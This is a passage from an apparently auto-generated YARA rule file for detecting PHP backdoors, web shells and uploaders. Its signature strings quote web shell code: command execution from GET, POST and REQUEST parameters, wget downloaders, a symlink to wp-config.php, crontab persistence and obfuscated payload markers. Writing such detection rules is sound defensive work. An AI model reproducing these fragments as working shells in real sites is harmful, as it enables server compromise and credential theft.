        $ps0
}

rule php_backdoor_shell_get_003 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR00265 and PR02726 and PR01341
}

private rule PR02727 : trigger
{
    strings:
        $ps0 = "echo \"gabisa"
    condition:
        $ps0
}

rule php_backdoor_shell_get_004 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR01392 and PR02727 and PR00357
}

private rule PR02728 : trigger
{
    strings:
        $ps0 = "echo touch(dirname(__FILE__)."
    condition:
        $ps0
}

private rule PR02729 : trigger
{
    strings:
        $ps0 = ").chr(rand("
    condition:
        $ps0
}

rule php_backdoor_shell_get_005 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR02728 and PR02729
}

private rule PR02730 : trigger
{
    strings:
        $ps0 = "$output = shell_exec($_GET['cmd']);"
    condition:
        $ps0
}

rule php_backdoor_shell_get_006 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02730
}

private rule PR02731 : trigger
{
    strings:
        $ps0 = "$check = array(\"/wso.php\",\"/up.php"
    condition:
        $ps0
}

rule php_backdoor_shellfinder_004 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR01021 and PR02731
}

rule php_backdoor_shellfinder_005 : backdoor
{
    strings:
        $trigger = "$shell2 = explode(\"\\n\",$shell);"
    condition:
        $trigger and PR00039 and PR02056
}

rule php_backdoor_shor7cutuploader_001 : backdoor
{
    strings:
        $trigger = "<title>SHOR7CUT | SIMPLE UPLOAD"
    condition:
        $trigger
}

private rule PR02732 : trigger
{
    strings:
        $ps0 = "is_deleteable' => $allow_delete && ((!is_dir($i) && is_writable($directory)) ||"
    condition:
        $ps0
}

rule php_backdoor_simple_file_manager_001 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR01021 and PR02732
}

rule php_backdoor_SimShell_001 : backdoor
{
    strings:
        $trigger = "<title>SimShell - Simorgh Security MGZ</title>"
    condition:
        $trigger
}

private rule PR02733 : trigger
{
    strings:
        $ps0 = "echo antivirus($dir,$exs,$matches) ? '<div></div>"
    condition:
        $ps0
}

rule php_backdoor_spider_antivirus_001 : backdoor
{
    strings:
        $trigger = "POST"
    condition:
        $trigger and PR02733
}

rule php_backdoor_spidershell_002 : backdoor
{
    strings:
        $trigger = "Spider PHP Shell"
    condition:
        $trigger
}

rule php_backdoor_spidershell_003 : backdoor
{
    strings:
        $trigger = "setcookie('admin_spiderpass"
    condition:
        $trigger
}

rule php_backdoor_sslChecker_001 : backdoor
{
    strings:
        $trigger = "$sslChecker($getUrl,'e'."
    condition:
        $trigger and PR00732
}

// MANUAL FIX NECESSARY
rule php_backdoor_str_replace_POST_001 : backdoor
{
    strings:
        $trigger = "$_POST"
        $php_backdoor_str_replace_POST_001_r0 = /str_replace\([^\)]+,.[\w]+.\);[\s]*@\$[\w]*\(\$_POST\[[\w]+\]\);/
    condition:
        $trigger and PR01444 and $php_backdoor_str_replace_POST_001_r0
}

private rule PR02734 : trigger
{
    strings:
        $ps0 = "'.#"
    condition:
        $ps0
}

private rule PR02735 : trigger
{
    strings:
        $ps0 = "('::r');"
    condition:
        $ps0
}

rule php_backdoor_str_rot13_004 : backdoor
{
    strings:
        $trigger = "));$"
    condition:
        $trigger and PR02734 and PR02735
}

private rule PR02736 : trigger
{
    strings:
        $ps0 = "\\k65\\k76\\k61\\k6P\\k28\\k67\\k7N\\k69\\k6R\\k66\\k6P"
    condition:
        $ps0
}

private rule PR02737 : trigger
{
    strings:
        $ps0 = "riny"
    condition:
        $ps0
}

rule php_backdoor_str_rot13_005 : backdoor
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR02736 and PR02737
}

private rule PR02738 : trigger
{
    strings:
        $ps0 = "###=CACH"
    condition:
        $ps0
}

private rule PR02739 : trigger
{
    strings:
        $ps0 = "assert_options(ASSERT_WARNING, 0);"
    condition:
        $ps0
}

rule php_backdoor_str_rot13_007 : backdoor
{
    strings:
        $trigger = "END=###"
    condition:
        $trigger and PR02738 and PR01368 and PR02739
}

private rule PR02740 : trigger
{
    strings:
        $ps0 = "$str_data = \""
    condition:
        $ps0
}

rule php_backdoor_str_rot13_008 : backdoor
{
    strings:
        $trigger = "$func = str_rot13(\"onfr64_qrpbqr\");"
    condition:
        $trigger and PR02740
}

private rule PR02741 : trigger
{
    strings:
        $ps0 = "header(\"location:"
    condition:
        $ps0
}

rule php_backdoor_str_rot13_uploader_001 : backdoor
{
    strings:
        $trigger = "vffrg(\\$_CBFG['_hcy']"
    condition:
        $trigger and PR02741
}

rule php_backdoor_Stupidc0de_001 : backdoor
{
    strings:
        $trigger = "Stupidc0de"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR02742 : trigger
{
    strings:
        $ps0 = "] = \"\\x"
    condition:
        $ps0
}

rule php_backdoor_sv1_0_1_001 : backdoor
{
    strings:
        $trigger = "echo @$GLOBALS[$GLOBALS["
    condition:
        $trigger and PR00029 and PR02742
}

rule php_backdoor_sv1_0_1_002 : backdoor
{
    strings:
        $trigger = ",);echo@$"
    condition:
        $trigger and PR01854 and PR00029
}

private rule PR02743 : trigger
{
    strings:
        $ps0 = "DQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw"
    condition:
        $ps0
}

rule php_backdoor_symlinksa_002 : backdoor
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR02743 and PR01479
}

private rule PR02744 : trigger
{
    strings:
        $ps0 = "cin\",0755);"
    condition:
        $ps0
}

rule php_backdoor_symlinksa_003 : backdoor
{
    strings:
        $trigger = "$write = fwrite ($file ,base64_decode($config));"
    condition:
        $trigger and PR01330 and PR02744
}

private rule PR02745 : trigger
{
    strings:
        $ps0 = "@symlink('/home/' . $user . '/public_html/wp-config.php', $user"
    condition:
        $ps0
}

rule php_backdoor_symlinksa_005 : backdoor
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR02745
}

private rule PR02746 : trigger
{
    strings:
        $ps0 = "(\"aGV4MmJpbg==\");"
    condition:
        $ps0
}

private rule PR02747 : trigger
{
    strings:
        $ps0 = "(\"cGFjaw==\");"
    condition:
        $ps0
}

private rule PR02748 : trigger
{
    strings:
        $ps0 = "(\"Y3JlYXRlX2Z1bmN0aW9u\");"
    condition:
        $ps0
}

rule php_backdoor_symlinksa_006 : backdoor
{
    strings:
        $trigger = "if(str"
    condition:
        $trigger and PR02746 and PR02747 and PR02748
}

rule php_backdoor_symlinksa_007 : backdoor
{
    strings:
        $trigger = "Copyright By Con7ext"
    condition:
        $trigger and PR01330 and PR00046
}

private rule PR02749 : trigger
{
    strings:
        $ps0 = "},\"safe_mode = Off"
    condition:
        $ps0
}

rule php_backdoor_symlinksa_008 : backdoor
{
    strings:
        $trigger = "]},\"Options +FollowSymLinks "
    condition:
        $trigger and PR01398 and PR02749
}

rule php_backdoor_system_001_001 : backdoor
{
    strings:
        $trigger = "@system(base64_decode('a2lsbGFsbCAtOSA=').basename(base64_decode("
    condition:
        $trigger
}

rule php_backdoor_system_005 : backdoor
{
    strings:
        $trigger = "echo \"<pre>\"; system($payload);"
    condition:
        $trigger
}

private rule PR02750 : trigger
{
    strings:
        $ps0 = "));}elseif(function_exists('call_user_func')){call_user_func('system',"
    condition:
        $ps0
}

rule php_backdoor_system_007 : backdoor
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR02750
}

private rule PR02751 : trigger
{
    strings:
        $ps0 = "grep -oP '(?<=ESTABLISHED )([0-9]+)'|head -1`;wget"
    condition:
        $ps0
}

rule php_backdoor_system_008 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR02751
}

rule php_backdoor_system_009 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR01848 and PR01796 and PR01445
}

private rule PR02752 : trigger
{
    strings:
        $ps0 = "$_GET"
    condition:
        $ps0
}

rule php_backdoor_system_009_02 : backdoor
{
    strings:
        $trigger = "print system($"
    condition:
        $trigger and PR02752
}

rule php_backdoor_system_010 : backdoor
{
    strings:
        $trigger = "$sonuc = shell_exec($komut) ;"
    condition:
        $trigger
}

private rule PR02753 : trigger
{
    strings:
        $ps0 = ".:Cyber Shell (v 1.0):."
    condition:
        $ps0
}

rule php_backdoor_system_011 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR02753
}

// MANUAL FIX NECESSARY
rule php_backdoor_system_013 : backdoor
{
    strings:
        $trigger = "REQUE"
        $php_backdoor_system_013_r0 = /if[\s]*\([\s]*isset[\s]*\([\s]*\$_REQUEST\[[^{]+\{[\s]*system\([\s]*\$_REQUEST/
    condition:
        $trigger and PR00397 and PR01445 and $php_backdoor_system_013_r0
}

private rule PR02754 : trigger
{
    strings:
        $ps0 = "reboot\"] == \"yes\") system(base64_decode(\"cHMgLWVmIH"
    condition:
        $ps0
}

rule php_backdoor_system_014 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02754
}

private rule PR02755 : trigger
{
    strings:
        $ps0 = "@file_put_contents($filename,base64_decode($"
    condition:
        $ps0
}

private rule PR02756 : trigger
{
    strings:
        $ps0 = "$_GET['cmd'];"
    condition:
        $ps0
}

rule php_backdoor_system_015 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR02755 and PR02756
}

// MANUAL FIX NECESSARY
private rule PR02757 : trigger
{
    strings:
        $ps0 = "echo system"
    condition:
        $ps0
}

rule php_backdoor_system_016 : backdoor
{
    strings:
        $trigger = "system("
        $php_backdoor_system_016_r0 = /if[\s]*\([\s]*isset[\s]*\([\s]*\$_POST\[.[\w]+.\]\)\)[\s]*echo[\s]*system/
    condition:
        $trigger and PR02757 and $php_backdoor_system_016_r0
}

private rule PR02758 : trigger
{
    strings:
        $ps0 = "?><?php $cmd = <<<EOD"
    condition:
        $ps0
}

private rule PR02759 : trigger
{
    strings:
        $ps0 = "system($_REQUEST[$cmd]);"
    condition:
        $ps0
}

rule php_backdoor_system_017 : backdoor
{
    strings:
        $trigger = "isset"
    condition:
        $trigger and PR02758 and PR02759
}

rule php_backdoor_system_018 : backdoor
{
    strings:
        $trigger = "echo system(base64_decode($_GET["
    condition:
        $trigger
}

rule php_backdoor_system_019 : backdoor
{
    strings:
        $trigger = "c3lzdGVtKCRfR0VUWyJ"
    condition:
        $trigger and PR01398
}

private rule PR02760 : trigger
{
    strings:
        $ps0 = "system(\"php"
    condition:
        $ps0
}

rule php_backdoor_system_020 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR02760
}

rule php_backdoor_system_021 : backdoor
{
    strings:
        $trigger = "chr(89).chr(109).'F'.chr(122).chr(90).\"T\".chr(89).chr(48).\"X\".'2'.chr(82).chr(108).chr(89).\"2\".\"9\".\"k\".chr(90).chr(81).chr(61).chr(61)"
    condition:
        $trigger and PR01330 and PR01479
}

// MANUAL FIX NECESSARY
rule php_backdoor_system_022 : backdoor
{
    strings:
        $trigger = "echo"
        $php_backdoor_system_022_r0 = /echo[\s]*[^;]+;[\s]*\$[\w]+[\s]*=[\s]*(.[\w]+.\.?)+;[\s]*\$[\w]+\(\$_GET\[[\d]+\]\);/
    condition:
        $trigger and PR01382 and $php_backdoor_system_022_r0
}

private rule PR02761 : trigger
{
    strings:
        $ps0 = "$hook($_POST['cmd']);"
    condition:
        $ps0
}

rule php_backdoor_system_023 : backdoor
{
    strings:
        $trigger = "chr(0x"
    condition:
        $trigger and PR02761
}

private rule PR02762 : trigger
{
    strings:
        $ps0 = "system(\"wget http"
    condition:
        $ps0
}

rule php_backdoor_system_024 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02762
}

private rule PR02763 : trigger
{
    strings:
        $ps0 = "(!empty($_GET['abc']))"
    condition:
        $ps0
}

rule php_backdoor_system_025 : backdoor
{
    strings:
        $trigger = "system($_GET['abc']);"
    condition:
        $trigger and PR02763
}

private rule PR02764 : trigger
{
    strings:
        $ps0 = "header('Location: http:"
    condition:
        $ps0
}

rule php_backdoor_system_026 : backdoor
{
    strings:
        $trigger = "if (!isset($_GET['cmd"
    condition:
        $trigger and PR02764
}

private rule PR02765 : trigger
{
    strings:
        $ps0 = "])){ echo \"<pre>\";"
    condition:
        $ps0
}

rule php_backdoor_system_027 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR02765 and PR00397 and PR01445
}

private rule PR02766 : trigger
{
    strings:
        $ps0 = "system($cmd);"
    condition:
        $ps0
}

rule php_backdoor_system_028 : backdoor
{
    strings:
        $trigger = "phpinfo();"
    condition:
        $trigger and PR02766 and PR00507
}

private rule PR02767 : trigger
{
    strings:
        $ps0 = "system($_REQUEST["
    condition:
        $ps0
}

private rule PR02768 : trigger
{
    strings:
        $ps0 = "copy($_FILES["
    condition:
        $ps0
}

private rule PR02769 : trigger
{
    strings:
        $ps0 = "multipart/form-data"
    condition:
        $ps0
}

rule php_backdoor_system_029 : backdoor
{
    strings:
        $trigger = "isset"
    condition:
        $trigger and PR02767 and PR02768 and PR02769
}

rule php_backdoor_system_030 : backdoor
{
    strings:
        $trigger = "])){system($_GET["
    condition:
        $trigger and PR01780
}

private rule PR02770 : trigger
{
    strings:
        $ps0 = "if($_POST['cmd'])"
    condition:
        $ps0
}

rule php_backdoor_system_031 : backdoor
{
    strings:
        $trigger = "system($_POST["
    condition:
        $trigger and PR02770
}

private rule PR02771 : trigger
{
    strings:
        $ps0 = "'s'.'y'.'s'.'t'.'e'.'m';"
    condition:
        $ps0
}

rule php_backdoor_system_032 : backdoor
{
    strings:
        $trigger = "(base64_decode($_REQUEST["
    condition:
        $trigger and PR02771
}

// MANUAL FIX NECESSARY
private rule PR02772 : trigger
{
    strings:
        $ps0 = "<?php system($_GET"
    condition:
        $ps0
}

rule php_backdoor_system_033 : backdoor
{
    strings:
        $trigger = "$_GET["
        $php_backdoor_system_033_r0 = /<\?php\s+system\(\$_GET\[[^;]+;\s+\?>/
    condition:
        $trigger and PR02772 and $php_backdoor_system_033_r0
}

private rule PR02773 : trigger
{
    strings:
        $ps0 = "Exec_Run(\"chmod \".$file"
    condition:
        $ps0
}

rule php_backdoor_system_shell_004 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR02773 and PR01466
}

private rule PR02774 : trigger
{
    strings:
        $ps0 = "DQokYXV0aF9wYXNzID0gIiI7DQokY29sb3IgPS"
    condition:
        $ps0
}

rule php_backdoor_system_shell_008 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR01422 and PR02774 and PR01466
}

private rule PR02775 : trigger
{
    strings:
        $ps0 = "IIIIIIIII"
    condition:
        $ps0
}

private rule PR02776 : trigger
{
    strings:
        $ps0 = "fclose($IIIIIIII"
    condition:
        $ps0
}

rule php_backdoor_system_shell_009 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR02775 and PR02776
}

private rule PR02777 : trigger
{
    strings:
        $ps0 = "<title>Uploader"
    condition:
        $ps0
}

rule php_backdoor_system_shell_010 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR02777
}

private rule PR02778 : trigger
{
    strings:
        $ps0 = "str_replace('@',' ',$x);"
    condition:
        $ps0
}

rule php_backdoor_system_shell_011 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR02778 and PR02756
}

private rule PR02779 : trigger
{
    strings:
        $ps0 = "<title></title>"
    condition:
        $ps0
}

private rule PR02780 : trigger
{
    strings:
        $ps0 = "!isset($_COOKIE[md5("
    condition:
        $ps0
}

rule php_backdoor_system_shell_012 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR02779 and PR02780
}

private rule PR02781 : trigger
{
    strings:
        $ps0 = "echo \"<u>\".php_uname("
    condition:
        $ps0
}

rule php_backdoor_system_shell_013 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR02781
}

private rule PR02782 : trigger
{
    strings:
        $ps0 = "host encrypt publickey.pub"
    condition:
        $ps0
}

rule php_backdoor_system_shell_014 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR02782
}

rule php_backdoor_system_shell_015 : backdoor
{
    strings:
        $trigger = "killall -9 perl"
    condition:
        $trigger and PR01445
}

private rule PR02783 : trigger
{
    strings:
        $ps0 = "$cmd = array(\"wget $url -O "
    condition:
        $ps0
}

rule php_backdoor_system_shell_016 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR02783
}

private rule PR02784 : trigger
{
    strings:
        $ps0 = "@system(\"killall"
    condition:
        $ps0
}

rule php_backdoor_system_shell_017 : backdoor
{
    strings:
        $trigger = "(crontab -l|grep -v crontab;echo;echo"
    condition:
        $trigger and PR01468 and PR02784
}

private rule PR02785 : trigger
{
    strings:
        $ps0 = "<?php echo basename($_SERVER["
    condition:
        $ps0
}

rule php_backdoor_system_shell_018 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR02785 and PR02752 and PR01225
}

rule php_backdoor_taxonomy_001 : backdoor
{
    strings:
        $trigger = "function register_and_cache_taxonomy() {"
    condition:
        $trigger and PR01483
}

private rule PR02786 : trigger
{
    strings:
        $ps0 = "$_[+$_]++;"
    condition:
        $ps0
}

rule php_backdoor_type_juggling_001 : backdoor
{
    strings:
        $trigger = "ZXZ"
    condition:
        $trigger and PR02786
}

rule php_backdoor_unknownshell_service_001 : backdoor
{
    strings:
        $trigger = "die('<pre><center>Cant run shell."
    condition:
        $trigger
}

private rule PR02787 : trigger
{
    strings:
        $ps0 = "method=\"post\" enctype=\"multipart/form-data\" name=\"u"
    condition:
        $ps0
}

rule php_backdoor_uploader_001_03 : backdoor
{
    strings:
        $trigger = "echo '<"
    condition:
        $trigger and PR02787 and PR02388
}

rule php_backdoor_uploader_001_04 : backdoor
{
    strings:
        $trigger = "copy($_FILES"
    condition:
        $trigger and PR00049
}

rule php_backdoor_uploader_001_05 : backdoor
{
    strings:
        $trigger = "copy($_FILES"
    condition:
        $trigger and PR01408
}

rule php_backdoor_uploader_001_06 : backdoor
{
    strings:
        $trigger = "// Silence is golden."
    condition:
        $trigger and PR02388
}

private rule PR02788 : trigger
{
    strings:
        $ps0 = "function printLogin()"
    condition:
        $ps0
}

rule php_backdoor_uploader_001_07 : backdoor
{
    strings:
        $trigger = "copy($_FILES"
    condition:
        $trigger and PR02787 and PR02788
}

rule php_backdoor_uploader_001_08 : backdoor
{
    strings:
        $trigger = "if($_POST['_upl']=='up')"
    condition:
        $trigger and PR02388
}

private rule PR02789 : trigger
{
    strings:
        $ps0 = "if(isset($_POST[\"submit\"])) { if (@copy($_FILES[\"filetoupload\"][\"tmp_name\"], $_FILES[\"filetoupload\"][\"name\"]))"
    condition:
        $ps0
}

rule php_backdoor_uploader_001_09 : backdoor
{
    strings:
        $trigger = ") { echo \"<title>"
    condition:
        $trigger and PR02789
}

rule php_backdoor_uploader_008 : backdoor
{
    strings:
        $trigger = "if ($fn==false){echo \"File open error\\n\";die;}else echo \"File open success\\n\";"
    condition:
        $trigger and PR01330 and PR01479
}

rule php_backdoor_uploader_009 : backdoor
{
    strings:
        $trigger = "sendFile($url['host'], $url['path'] . \"?upload=1\", $name, $content);"
    condition:
        $trigger and PR00732
}

private rule PR02790 : trigger
{
    strings:
        $ps0 = "str_replace($request_dir,'',$our_dir);"
    condition:
        $ps0
}

rule php_backdoor_uploader_010 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02790
}

rule php_backdoor_uploader_012 : backdoor
{
    strings:
        $trigger = "elseif($_REQUEST[\"myaction\"]==\"dounzip\"):"
    condition:
        $trigger
}

rule php_backdoor_uploader_013 : backdoor
{
    strings:
        $trigger = "loveLogin() {"
    condition:
        $trigger and PR00039 and PR02056
}

private rule PR02791 : trigger
{
    strings:
        $ps0 = "echo \"FILE UPLOADED TO $destination\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_014 : backdoor
{
    strings:
        $trigger = "if (file_exists("
    condition:
        $trigger and PR02791
}

rule php_backdoor_uploader_015 : backdoor
{
    strings:
        $trigger = "echo \"Hacking Attempt\";"
    condition:
        $trigger
}

rule php_backdoor_uploader_020 : backdoor
{
    strings:
        $trigger = "$_FILES['F1l3'"
    condition:
        $trigger and PR01648
}

rule php_backdoor_uploader_021 : backdoor
{
    strings:
        $trigger = "@move_uploaded_file($userfile_tmp, $abod);"
    condition:
        $trigger
}

rule php_backdoor_uploader_022 : backdoor
{
    strings:
        $trigger = "_sessions_debug_data = base64_decode(preg_replace(array"
    condition:
        $trigger
}

rule php_backdoor_uploader_023 : backdoor
{
    strings:
        $trigger = "join(\"\\x0A\", array(\""
    condition:
        $trigger and PR01818
}

rule php_backdoor_uploader_027 : backdoor
{
    strings:
        $trigger = "echo('[ok] - [s:'.filesize($_POST['fn']).'] '.$_POST['fn']);"
    condition:
        $trigger
}

rule php_backdoor_uploader_029 : backdoor
{
    strings:
        $trigger = "$res[] = file_get_contents('php://input');"
    condition:
        $trigger
}

private rule PR02792 : trigger
{
    strings:
        $ps0 = "$_REQUEST[\"wp_super_hash_nonce\"]=datetime)) {  echo \"<all_ok_doit"
    condition:
        $ps0
}

rule php_backdoor_uploader_030 : backdoor
{
    strings:
        $trigger = "exit"
    condition:
        $trigger and PR02792
}

rule php_backdoor_uploader_031 : backdoor
{
    strings:
        $trigger = "md5($ups) == $ups_md5 && !empty($HTTP_POST_FILES['uploadfile']"
    condition:
        $trigger
}

private rule PR02793 : trigger
{
    strings:
        $ps0 = "$cmd = $_POST['cmd'];"
    condition:
        $ps0
}

rule php_backdoor_uploader_032 : backdoor
{
    strings:
        $trigger = "error_reporting"
    condition:
        $trigger and PR02793
}

rule php_backdoor_uploader_035 : backdoor
{
    strings:
        $trigger = "if(isset($_REQUEST['zalivka'])) {"
    condition:
        $trigger
}

private rule PR02794 : trigger
{
    strings:
        $ps0 = "$result[$root_name] = scan($root_dir);"
    condition:
        $ps0
}

rule php_backdoor_uploader_038 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02794
}

rule php_backdoor_uploader_039 : backdoor
{
    strings:
        $trigger = ".php\", \"w+\"); fwrite($fo, $cmd1); fclose($fo); ?>"
    condition:
        $trigger
}

private rule PR02795 : trigger
{
    strings:
        $ps0 = "$_FILES['F1l3'"
    condition:
        $ps0
}

rule php_backdoor_uploader_041 : backdoor
{
    strings:
        $trigger = "echo 'You are forbidden!"
    condition:
        $trigger and PR01648 and PR02795
}

rule php_backdoor_uploader_043 : backdoor
{
    strings:
        $trigger = "$f=$_FILES[x];copy($f[tmp_name],$f[name]);"
    condition:
        $trigger
}

private rule PR02796 : trigger
{
    strings:
        $ps0 = "$post_data[$upfile] = '@'. $_FILES[$upfile]['tmp_name'].';filename='.$_FILES[$upfile]['name'].';type='.$_FILES[$upfile]['type'];"
    condition:
        $ps0
}

rule php_backdoor_uploader_044 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR02796
}

rule php_backdoor_uploader_045 : backdoor
{
    strings:
        $trigger = "$cmd = \"wget -q \\\"$url\\\" -O $outputfile\";"
    condition:
        $trigger and PR00732
}

rule php_backdoor_uploader_045_01 : backdoor
{
    strings:
        $trigger = ">FileDownloader"
    condition:
        $trigger
}

private rule PR02797 : trigger
{
    strings:
        $ps0 = "if($password==\"\"||$filename==\"\"||$body==\"\")"
    condition:
        $ps0
}

rule php_backdoor_uploader_047 : backdoor
{
    strings:
        $trigger = "echo \"publish success & uploaded\""
    condition:
        $trigger and PR02797 and PR01362
}

private rule PR02798 : trigger
{
    strings:
        $ps0 = "echo \"Error: \" . $_FILES[\"file\"][\"error\"]"
    condition:
        $ps0
}

rule php_backdoor_uploader_048 : backdoor
{
    strings:
        $trigger = "print \"<a href=\\\"$file_name\\\" target=\\\"_blank\\\">$file_name<"
    condition:
        $trigger and PR01648 and PR02798
}

private rule PR02799 : trigger
{
    strings:
        $ps0 = "fwrite($fp,\"\\xEF\\xBB\\xBF\".$body);"
    condition:
        $ps0
}

rule php_backdoor_uploader_049 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02799
}

rule php_backdoor_uploader_050 : backdoor
{
    strings:
        $trigger = "== $hashcode"
    condition:
        $trigger and PR01648
}

private rule PR02800 : trigger
{
    strings:
        $ps0 = "== $hashcode &&"
    condition:
        $ps0
}

rule php_backdoor_uploader_050_01 : backdoor
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR02800
}

private rule PR02801 : trigger
{
    strings:
        $ps0 = "echo \"<b>Done ==> </b><a href='$fullURL' target='_blank'>$user_file_name</a> - \" . $changeTime;"
    condition:
        $ps0
}

rule php_backdoor_uploader_051 : backdoor
{
    strings:
        $trigger = "@touch($destination, $changeTime);"
    condition:
        $trigger and PR02801 and PR01648
}

private rule PR02802 : trigger
{
    strings:
        $ps0 = "GET[timeout]&cms=$_GET[cms]&sh=$_GET[sh]&upattern=$_GET[upattern]&upattern2=$_GET[upattern2]\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_052 : backdoor
{
    strings:
        $trigger = "gzuncompress"
    condition:
        $trigger and PR02802
}

rule php_backdoor_uploader_053 : backdoor
{
    strings:
        $trigger = "echo '__success__'.$NowSubFolders.'__success__';"
    condition:
        $trigger and PR01425
}

private rule PR02803 : trigger
{
    strings:
        $ps0 = "touch("
    condition:
        $ps0
}

private rule PR02804 : trigger
{
    strings:
        $ps0 = "if (md5"
    condition:
        $ps0
}

private rule PR02805 : trigger
{
    strings:
        $ps0 = "isset($_REQUEST[cmd]"
    condition:
        $ps0
}

rule php_backdoor_uploader_054 : backdoor
{
    strings:
        $trigger = "file_put_contents(\"$name\",$a);"
    condition:
        $trigger and PR02803 and PR02804 and PR02805
}

rule php_backdoor_uploader_055 : backdoor
{
    strings:
        $trigger = "@extract ($_REQUEST); file_put_contents"
    condition:
        $trigger
}

private rule PR02806 : trigger
{
    strings:
        $ps0 = "if (!file_exists(__FILE__)){echo \"self deleted\\n\";}else{echo \"self NOT deleted2\\n\";}"
    condition:
        $ps0
}

rule php_backdoor_uploader_056 : backdoor
{
    strings:
        $trigger = "fwrit"
    condition:
        $trigger and PR02806
}

rule php_backdoor_uploader_056_002 : backdoor
{
    strings:
        $trigger = "written%3Dfwrite%28%24fp%2C%24fdata"
    condition:
        $trigger and PR00265
}

private rule PR02807 : trigger
{
    strings:
        $ps0 = "= base64_decode(\"d2dldCBodHRw"
    condition:
        $ps0
}

rule php_backdoor_uploader_057 : backdoor
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR02807
}

rule php_backdoor_uploader_058 : backdoor
{
    strings:
        $trigger = "$dim.$im['name']);echo\"Done: \".$dim.$im    "
    condition:
        $trigger and PR01648
}

rule php_backdoor_uploader_059 : backdoor
{
    strings:
        $trigger = "if ($_POST[\"pt\"]==\"\"){$uploadfile = $_FILES[\"file\"][\"name\"];}"
    condition:
        $trigger and PR00732
}

rule php_backdoor_uploader_060 : backdoor
{
    strings:
        $trigger = "$ufile )) { echo \"<b>Uploaded !!!</b>\" ; } else { echo"
    condition:
        $trigger and PR00507
}

rule php_backdoor_uploader_061 : backdoor
{
    strings:
        $trigger = "Echo \"<script>alert('upload Done');"
    condition:
        $trigger and PR01648
}

rule php_backdoor_uploader_062 : backdoor
{
    strings:
        $trigger = "if(isset($_GET['bataboom'])){if(isset"
    condition:
        $trigger and PR01648
}

private rule PR02808 : trigger
{
    strings:
        $ps0 = "if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload"
    condition:
        $ps0
}

rule php_backdoor_uploader_063 : backdoor
{
    strings:
        $trigger = "echo '<input type=\"file\" name=\"file\" size=\"50\"><input name"
    condition:
        $trigger and PR02808 and PR00507
}

private rule PR02809 : trigger
{
    strings:
        $ps0 = "$cmd=$_GET['cmd'];"
    condition:
        $ps0
}

private rule PR02810 : trigger
{
    strings:
        $ps0 = "echo '<input type=\"file\" name=\"file\" size=\"50\"><input name"
    condition:
        $ps0
}

rule php_backdoor_uploader_063_02 : backdoor
{
    strings:
        $trigger = "echo exec($cmd);"
    condition:
        $trigger and PR02809 and PR00507 and PR02810
}

private rule PR02811 : trigger
{
    strings:
        $ps0 = "echo \"<a href=\\\"$file\\\">$file</a>\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_064 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR02811
}

rule php_backdoor_uploader_065 : backdoor
{
    strings:
        $trigger = "if (password==pass1){alert(' yessss"
    condition:
        $trigger and PR01648
}

private rule PR02812 : trigger
{
    strings:
        $ps0 = "$pass=@md5($_POST"
    condition:
        $ps0
}

private rule PR02813 : trigger
{
    strings:
        $ps0 = "if($pass==$me)"
    condition:
        $ps0
}

rule php_backdoor_uploader_067 : backdoor
{
    strings:
        $trigger = "if ($error == UPLOAD_ERR_OK) {"
    condition:
        $trigger and PR01648 and PR02812 and PR02813
}

private rule PR02814 : trigger
{
    strings:
        $ps0 = "live = md5(md5(md5($_GET"
    condition:
        $ps0
}

rule php_backdoor_uploader_068 : backdoor
{
    strings:
        $trigger = "echo \"<b>Uploaded Successfully"
    condition:
        $trigger and PR01648 and PR02814
}

rule php_backdoor_uploader_069 : backdoor
{
    strings:
        $trigger = "<script>alert('Sukses Upload BOSS"
    condition:
        $trigger and PR01648
}

private rule PR02815 : trigger
{
    strings:
        $ps0 = "curl_get_from_webpage_one_time($url,$proxy"
    condition:
        $ps0
}

private rule PR02816 : trigger
{
    strings:
        $ps0 = "curl_get_from_webpage($"
    condition:
        $ps0
}

